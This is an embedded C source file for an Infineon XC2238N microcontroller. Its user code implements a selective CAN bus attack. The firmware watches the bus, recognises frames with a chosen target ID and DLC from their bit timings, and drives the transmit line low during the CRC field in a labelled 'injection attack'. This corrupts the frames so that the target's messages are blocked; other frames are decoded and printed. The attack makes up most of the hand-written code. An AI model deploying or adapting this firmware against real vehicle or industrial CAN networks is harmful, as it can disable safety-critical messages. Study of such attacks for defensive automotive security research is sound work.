//****************************************************************************
// @Module        Project Settings
// @Filename      MAIN.c
// @Project       EasyKit_XC2000.dav
//----------------------------------------------------------------------------
// @Controller    Infineon XC2238N-40F80
//
// @Compiler      TASKING VX-toolset
//
// @Codegenerator 2.1
//
// @Description   This file contains the project initialization function.
//
//----------------------------------------------------------------------------
// @Date          6/25/2018 15:56:05
//
//****************************************************************************

// USER CODE BEGIN (MAIN_General,1)

// USER CODE END



//****************************************************************************
// @Project Includes
//****************************************************************************

#include "MAIN.h"

// USER CODE BEGIN (MAIN_General,2)

// USER CODE END


//****************************************************************************
// @Macros
//****************************************************************************

// USER CODE BEGIN (MAIN_General,3)

// USER CODE END


//****************************************************************************
// @Defines
//****************************************************************************

// USER CODE BEGIN (MAIN_General,4)
#define TICK_INTER          10      // Number of ticks per 4us

#define NUM_ID_BIT          11      // Number of ID bits
#define NUM_BIT_CONTROL     19      // Number of bits of ID and control field
#define NUM_BIT_CONTROL_MAX 22      // Maximal number of bits of ID and control field

#define TARGET_ID           6       // ID whose messages are to be blocked
#define TARGET_DLC          8       // DLC of the target frame
// USER CODE END


//****************************************************************************
// @Typedefs
//****************************************************************************

// USER CODE BEGIN (MAIN_General,5)

// USER CODE END


//****************************************************************************
// @Imported Global Variables
//****************************************************************************

// USER CODE BEGIN (MAIN_General,6)

// USER CODE END


//****************************************************************************
// @Global Variables
//****************************************************************************

// USER CODE BEGIN (MAIN_General,7)

// USER CODE END


//****************************************************************************
// @External Prototypes
//****************************************************************************

// USER CODE BEGIN (MAIN_General,8)

// USER CODE END


//****************************************************************************
// @Prototypes Of Local Functions
//****************************************************************************

// USER CODE BEGIN (MAIN_General,9)
//****************************************************************************
// @Function      int self_round(double x)
//
//----------------------------------------------------------------------------
// @Description   This function implements a simple round function.
//
//----------------------------------------------------------------------------
// @Returnvalue   The rounded value.
//
//----------------------------------------------------------------------------
// @Parameters    double x:
//                  The value that should get rounded.
//
//****************************************************************************

int self_round(double x)
{
	int i = x;
	double res = x - i;
	if(res >= 0.5) res = i+1;
	else res = i;

	return res;
}

//****************************************************************************
// @Function      void precalculation_control_data(uint16_t id, uint8_t dlc,
//                     uint8_t req_rem, uint8_t id_ext, uint8_t time_data[])
//
//----------------------------------------------------------------------------
// @Description   This function calculates the duration of timeslots between
//                the edges of the ID and control field for a passed ID, DLC,
//                request remote bit and ID Ext. bit.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    uint16_t id:
//                  The ID of the CAN frame.
//                uint8_t dlc:
//                  The DLC (data length code) of the CAN frame.
//                uint8_t req_rem:
//                  Flag whether the request remote bit should be set.
//                uint8_t id_ext:
//                  Flag whether the ID Extended bit should be set.
//                  Note: At the moment this function does not support
//                        extended IDs
//                uint8_t time_data[]:
//                  Array to store the calculated durations of
//                  timeslots
//
//****************************************************************************

void precalculation_control_data(uint16_t id, uint8_t dlc, uint8_t req_rem, uint8_t id_ext, uint8_t time_data[])
{
    // Arrays to store the ID and the DLC in binary representation
    uint8_t id_bin[NUM_ID_BIT] = {0};
    uint8_t control_dlc[7] = {0};

    // Variables to store the calculated control data
    uint8_t control_data[NUM_BIT_CONTROL_MAX] = {0};
    uint8_t control_data_len = NUM_BIT_CONTROL_MAX;
    uint8_t num_bits = 0;
    uint8_t index = 0;

    // Array to store the duration of timeslots
    uint8_t time[NUM_BIT_CONTROL_MAX] = {0};

    // Calculate the binary representation of the ID
    for(uint8_t i = 0; i < NUM_ID_BIT; ++i)
	{
		id_bin[NUM_ID_BIT-1-i] = (id >> i) & 1;
    }

    // Calculate the binary representation of the control and DLC data
    control_dlc[0] = req_rem;
    control_dlc[1] = id_ext;
    for(uint8_t i = 0; i < 4; ++i) control_dlc[7-1-i] = (dlc >> i) & 1;

    // Merge ID and control/DLC bits
    for(uint8_t i = 1; i < NUM_BIT_CONTROL_MAX; ++i)
	{
        // Insert necessary stuff bits
        if(num_bits == 4)
		{
            control_data[i] = !control_data[i-1];
            num_bits = 0;
            ++i;
        }
        // Insert ID bits
        if(index < 11)
		{
            control_data[i] = id_bin[index];
            if(control_data[i-1] == id_bin[index++]) num_bits++;
            else num_bits = 0;
        }
        // Insert control and DLC bits
        else if(index >= 11 && index < 18)
		{
            control_data[i] = control_dlc[index-11];
            if(control_data[i-1] == control_dlc[index-11]) ++num_bits;
            else num_bits = 0;
            ++index;
        } else --control_data_len; // Calculate the real control data length
    }

    // Calculate the duration of timeslots
    num_bits = 1;
    index = 1;

    for(uint8_t i = 1; i < NUM_BIT_CONTROL_MAX && index < control_data_len; ++i)
	{
        // Count the number of successive equal states
        while(control_data[index] == control_data[index-1] && index < control_data_len)
		{
            ++num_bits;
            ++index;
        }
        // Calculate the duration of timeslots
        time[i] = num_bits * TICK_INTER;
        ++index;
        num_bits = 1;
    }

    // Copy the calculated control data to the given array
    for(uint8_t i = 0; i < NUM_BIT_CONTROL_MAX; ++i) time_data[i] = time[i];
}

// USER CODE END


//****************************************************************************
// @Function      void MAIN_vInit(void) 
//
//----------------------------------------------------------------------------
// @Description   This function initializes the microcontroller.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    None
//
//----------------------------------------------------------------------------
// @Date          6/25/2018
//
//****************************************************************************

// USER CODE BEGIN (Init,1)

// USER CODE END

void MAIN_vInit(void)
{
  // USER CODE BEGIN (Init,2)

  // USER CODE END

  //   globally disable interrupts
  PSW_IEN        =  0;          


  ///  -----------------------------------------------------------------------
  ///  Configuration of the System Clock:
  ///  -----------------------------------------------------------------------
  ///  - VCO clock used, input clock is connected
  ///  - input frequency is 8.00 MHz
  ///  - system clock is 80.00 MHz

  MAIN_vUnlockProtecReg();     // unlock write security

  MAIN_vChangeFreq();          // load PLL control register

  //   -----------------------------------------------------------------------
  //   SCU Interrupt Disable configuration:
  //   -----------------------------------------------------------------------
  SCU_INTDIS     =  0xFFFF;      // SCU Interrupt Disable Register

  //   -----------------------------------------------------------------------
  //   Initialization of the Peripherals:
  //   -----------------------------------------------------------------------

  //   initializes the Parallel Ports
  IO_vInit();

  //   initializes the General Purpose Timer Unit (GPT1)
  GPT1_vInit();

  //   initializes the General Purpose Timer Unit (GPT2)
  GPT2_vInit();


  //   -----------------------------------------------------------------------
  //   Initialization of the Bank Select registers:
  //   -----------------------------------------------------------------------


  //   -----------------------------------------------------------------------
  //   SCU Interrupt Source Selection configuration:
  //   -----------------------------------------------------------------------
  SCU_ISSR       =  0x0000;      // SCU Interrupt Source Select Register

  // USER CODE BEGIN (Init,3)

  // USER CODE END

  MAIN_vLockProtecReg();       // lock write security

  //   globally enable interrupts
  PSW_IEN        =  1;          

} //  End of function MAIN_vInit


//****************************************************************************
// @Function      void MAIN_vUnlockProtecReg(void) 
//
//----------------------------------------------------------------------------
// @Description   This function makes it possible to write one protected 
//                register.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    None
//
//----------------------------------------------------------------------------
// @Date          6/25/2018
//
//****************************************************************************

// USER CODE BEGIN (UnlockProtecReg,1)

// USER CODE END

void MAIN_vUnlockProtecReg(void)
{
  uword uwPASSWORD;

    SCU_SLC = 0xAAAA;                   // command 0
    SCU_SLC = 0x5554;                   // command 1

    uwPASSWORD = SCU_SLS & 0x00FF;
    uwPASSWORD = (~uwPASSWORD) & 0x00FF;

    SCU_SLC = 0x9600 | uwPASSWORD;      // command 2
    SCU_SLC = 0x0000;                   // command 3

} //  End of function MAIN_vUnlockProtecReg


//****************************************************************************
// @Function      void MAIN_vLockProtecReg(void) 
//
//----------------------------------------------------------------------------
// @Description   This function makes it possible to lock one protected 
//                register.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    None
//
//----------------------------------------------------------------------------
// @Date          6/25/2018
//
//****************************************************************************

// USER CODE BEGIN (LockProtecReg,1)

// USER CODE END

void MAIN_vLockProtecReg(void)
{
  uword uwPASSWORD;

    SCU_SLC = 0xAAAA;                   // command 0
    SCU_SLC = 0x5554;                   // command 1

    uwPASSWORD = SCU_SLS & 0x00FF;
    uwPASSWORD = (~uwPASSWORD) & 0x00FF;

    SCU_SLC = 0x9600 | uwPASSWORD;      // command 2
    SCU_SLC = 0x1800;                   // command 3; new PASSWOR is 0x00

    uwPASSWORD = SCU_SLS & 0x00FF;
    uwPASSWORD = (~uwPASSWORD) & 0x00FF;
    SCU_SLC = 0x8E00 | uwPASSWORD;      // command 4

} //  End of function MAIN_vLockProtecReg


//****************************************************************************
// @Function      void MAIN_vChangeFreq(void) 
//
//----------------------------------------------------------------------------
// @Description   This function is used to select the external crystal and
//                configure the system frequency to 100MHz/80MHz/66MHz.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    None
//
//----------------------------------------------------------------------------
// @Date          6/25/2018
//
//****************************************************************************

// USER CODE BEGIN (ChangeFreq,1)

// USER CODE END

void MAIN_vChangeFreq(void)
{
  Scs_ErrorType Error;

  Scs_EnableHighPrecOsc(1U);

  //For application and internal application resets, the complete PLL configuration could be avoided
  //The entry from application resets and internal application reset is covered in the following differentiation
  //in int/ext clock in lock/unlocked state.

  if  ((SCU_PLLSTAT & 0x0004) == 0x0004)       // fR derived from Internal clock
  {
    //Normal startup state during boot and the clock
    //has to be in the next step configured on the external crystal
    //use XTAL/VCO, count XTAL clock

    Scs_InitTimer();       // initialize CCU6 timer T13 for SCS driver

    // perform transition from base mode to normal mode, check for error
    Error = Scs_GoFromBaseModeToNormalMode();
    if(Error)
    {
      for(;;)      // this part of code should not be reached
      {
        NOP();
      }
    }

    if ((SCU_PLLSTAT & 0x1009) == 0x1009)      // fR derived from external crystal clock + VCO is locked
    {
      //usually after an application reset where clock need not be configured again.
      //check K2/P/N values and decide whether these values have to be adapted based on application needs.
      NOP();
      //usually the PLL losss of Lock TRAP schould be enabled here.
    }
    else       //fR derived from external crystal clock + VCO is not locked
    {
               //estimate the K1 value and the current frequency
               //reduce K2/P/N values in steps so that the frequency
               //jumps is limited to 20MHz or factor of 5 whichever is minimum
      NOP();
    }


  }

} //  End of function MAIN_vChangeFreq


//****************************************************************************
// @Function      void main(void) 
//
//----------------------------------------------------------------------------
// @Description   This is the main function.
//
//----------------------------------------------------------------------------
// @Returnvalue   None
//
//----------------------------------------------------------------------------
// @Parameters    None
//
//----------------------------------------------------------------------------
// @Date          6/25/2018
//
//****************************************************************************

// USER CODE BEGIN (Main,1)

// USER CODE END

void main(void)
{
  // USER CODE BEGIN (Main,2)

  // ---------------------------CAN-Pin-Assignment----------------------------
  // CAN1
  // TX		IO_P2_5
  // RX		IO_P2_6
  //
  // CAN2
  // TX		IO_P10_12
  // RX		IO_P10_11
  // -------------------------------------------------------------------------

  // USER CODE END

  MAIN_vInit();

  // USER CODE BEGIN (Main,3)

  uint32_t id = 0;                                              // ID of the current frame
  uint32_t dlc = 0;                                             // DLC of the current frame

  uint8_t target_detected = 1;                                  // Flag indicating whether the current frame is the target frame

  uint16_t timer_value = 0;                                     // Current timer value
  uint16_t last_timer_value;                                    // Last timer value
  uint16_t timeout_control = NUM_BIT_CONTROL * TICK_INTER;      // Current control timeout
  uint16_t timeout_data = 8 * TICK_INTER;                       // Current data timeout

  // Variables for timing the injection attack
  uint16_t injection_timer = 0;
  uint16_t injection_timeout = 5 * TICK_INTER;

  uint16_t time[NUM_BIT_CONTROL+1];                             // Timestamps of the ID and control field
  uint8_t stuff_bits[NUM_BIT_CONTROL+1];                        // Position of stuff bits in the ID and control field
  uint8_t control_data[NUM_BIT_CONTROL];                        // Calculated ID and control data

  uint8_t target_time[NUM_BIT_CONTROL_MAX];                     // Duration of timeslots of the target ID and control field

  // Variables to store the current bus state and the index to write the next timestamp
  uint8_t state = 1;
  uint8_t index = 1;
  uint8_t diff;

  // Initalize time, control data and stuff bit array
  for(int i = 0; i < NUM_BIT_CONTROL; ++i) control_data[i] = 0;
  for(int i = 0; i < NUM_BIT_CONTROL+1; ++i) time[i] = stuff_bits[i] = 0;

  // Initalize target_time array
  for(int i = 0; i < NUM_BIT_CONTROL_MAX; ++i) target_time[i] = 0;
  // Calculate duration of timeslots for the target frame with target ID and DLC
  precalculation_control_data(TARGET_ID, TARGET_DLC, 0, 0, target_time);

  // Initalize output pin
  IO_vSetPin(IO_P10_12);

  // Stop and reset timer
  GPT1_vClearTmr(GPT1_TIMER_3);

  // USER CODE END

  while(1)
  {

   // USER CODE BEGIN (Main,4)

	  // Wait for Start-of-Frame bit
	  while(IO_ubReadPin(IO_P2_6) == state);

	  // Start of a new frame
	  GPT1_vStartTmr(GPT1_TIMER_3);

	  // Capture all ID and control bits
	  while(timer_value < timeout_control)
	  {
		if(IO_ubReadPin(IO_P2_6) != state)
		{
			time[index] = GPT1_uwReadTmr(GPT1_TIMER_3);
			diff = time[index]-time[index-1];
			// Check if the next bit will be a stuff bit
			if(diff > 44)
			{
				stuff_bits[index] = 1;                      // Tag bit as a stuff bit
				timeout_control += TICK_INTER;              // Adapt the control data timeout
			}
			// Check if the current frame has the target ID
			if(diff < (target_time[index-1] - 3) || diff > (target_time[index-1] + 3)) target_detected = 0;
			//IO_vTogglePin(IO_P10_12);
			state = !state;
			++index;
		}

		timer_value = GPT1_uwReadTmr(GPT1_TIMER_3);
	  }


	  // If the current frame has the target ID, then all data bits are captured
	  if(target_detected)
	  {
		  // Prepare for capturing data bits
		  last_timer_value = time[index-1];
		  timeout_data += timeout_control + (TARGET_DLC-1) * 8 * TICK_INTER;       // Adjust the data timeout to the DLC and actual control timeout

		  // Capture all data bits
		  while(timer_value < timeout_data)
		  {
			  if(IO_ubReadPin(IO_P2_6) != state)
			  {
				timer_value = GPT1_uwReadTmr(GPT1_TIMER_3);
				// Check if the next bit will be a stuff bit
				if(timer_value - last_timer_value > 44) timeout_data += TICK_INTER;
				last_timer_value = timer_value;
				state = !state;
			  }

			  timer_value = GPT1_uwReadTmr(GPT1_TIMER_3);
		  }

          // Start of the CRC field
		  // Wait for first low state in the CRC field
		  while(!IO_ubReadPin(IO_P2_6));
		  // Start of the injection
		  IO_vResetPin(IO_P2_5);
		  injection_timer = GPT1_uwReadTmr(GPT1_TIMER_3);
		  injection_timeout += injection_timer;
		  while(injection_timer < injection_timeout) injection_timer = GPT1_uwReadTmr(GPT1_TIMER_3);
		  IO_vSetPin(IO_P2_5);  // End of the injection

		  // Set target values as ID and DLC for output
		  id = TARGET_ID;
		  dlc = TARGET_DLC;

		  // Wait for End-of-Frame
		  last_timer_value = timer_value = GPT1_uwReadTmr(GPT1_TIMER_3);
		  while(timer_value - last_timer_value < 6 * TICK_INTER) timer_value = GPT1_uwReadTmr(GPT1_TIMER_3);

      // If the current frame has not the target ID and DLC, just wait for the End-of-Frame
	  }else
	  {

		  // Prepare for capturing End-of-Frame
		  last_timer_value = time[index-1];

		  // Capturing End-of-Frame
		  while(timer_value - last_timer_value < 6 * TICK_INTER)
		  {
			  if(IO_ubReadPin(IO_P2_6) != state)
			  {
				  last_timer_value = GPT1_uwReadTmr(GPT1_TIMER_3);
				  state = !state;
			  }

			  timer_value = GPT1_uwReadTmr(GPT1_TIMER_3);
		  }

		  // Prepare for calculating the received ID and DLC
		  state = 0;
		  index = 1;
		  uint8_t num_state;

		  // Calculate control data
		  for(uint8_t ctr_index = 0; ctr_index < NUM_BIT_CONTROL;)
		  {
			num_state = self_round((time[index+1] - time[index])/10.0);         // Calculate the number of successive equal states
			if(stuff_bits[index]) --num_state;                                  // Ignore stuff bits
            // Calculate the binary representation of the control data
			for(; (num_state > 0) && (ctr_index < NUM_BIT_CONTROL); --num_state) control_data[ctr_index++] = state;
			state = !state;
			index++;
		  }

		  // Calculate the DLC from the binary representation of the control data
		  for(int i = 0; i < 4; ++i)
		  {
			dlc = dlc << 1;
			if(control_data[15+i]) ++dlc;
		  }

		  // Calculate the ID from the binary representation of the control data
		  for(int i = 0; i < 11; ++i)
		  {
			id = id << 1;
			if(control_data[1+i]) ++id;
		  }
	  }

	  // Print the ID and DLC
	  if(target_detected) printf("Frame from target ");
	  printf("ID: %x, ", id);
	  printf("DLC: %d\n", dlc);


	  // Reset time and stuff bit array, timeouts and other variables
	  for(int i = 0; i < 20; ++i) time[i] = stuff_bits[i] = 0;
	  index = 1;
	  state = 1;
	  timeout_control = NUM_BIT_CONTROL * TICK_INTER;
	  timeout_data = 8 * TICK_INTER;
	  id = 0;
	  dlc = 0;
	  target_detected = 1;
	  injection_timeout = 5 * TICK_INTER;
	  IO_vSetPin(IO_P10_12);

	  // Reset timer
	  GPT1_vClearTmr(GPT1_TIMER_3);
	  timer_value = GPT1_uwReadTmr(GPT1_TIMER_3);

   // USER CODE END

  }

} //  End of function main



// USER CODE BEGIN (MAIN_General,10)

// USER CODE END
